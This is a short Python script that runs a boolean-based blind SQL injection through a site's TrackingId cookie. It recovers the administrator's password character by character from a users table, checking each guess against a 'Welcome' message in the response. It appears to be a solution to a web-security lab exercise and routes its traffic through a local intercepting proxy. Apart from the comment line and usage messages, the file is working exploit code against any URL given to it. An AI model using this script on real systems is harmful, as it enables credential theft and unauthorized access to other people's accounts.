#Get password through Cookies and Blind SQLi statements
import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def cookies_extract(url):
	r = requests.get(url, verify=False, proxies=proxies)
	get_cookies = r.cookies
	trackingId = get_cookies.get('TrackingId')
	session = get_cookies.get('session')
	cookies = [trackingId, session]
	return cookies

def sqli_payload(url):
	get_cookies = cookies_extract(url)
	password_extracted = ""
	for i in range(1, 21):
		for j in range(32, 126):
			payload = f"' AND (SELECT ASCII(substring(password, {i},1)) from users where username='administrator')='{j}'--"
			payload_encoded = urllib.parse.quote(payload)
			cookies = {'TrackingId': get_cookies[0] + payload_encoded, 'session': get_cookies[1]}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if "Welcome" not in r.text:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
			else:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)
	try:
		print('\033[32m[+] Retrieving administrator password...\033[0m')
		sqli_payload(url)
	except KeyboardInterrupt:
		print('\n\033[33m[+] Exited...\033[0m')
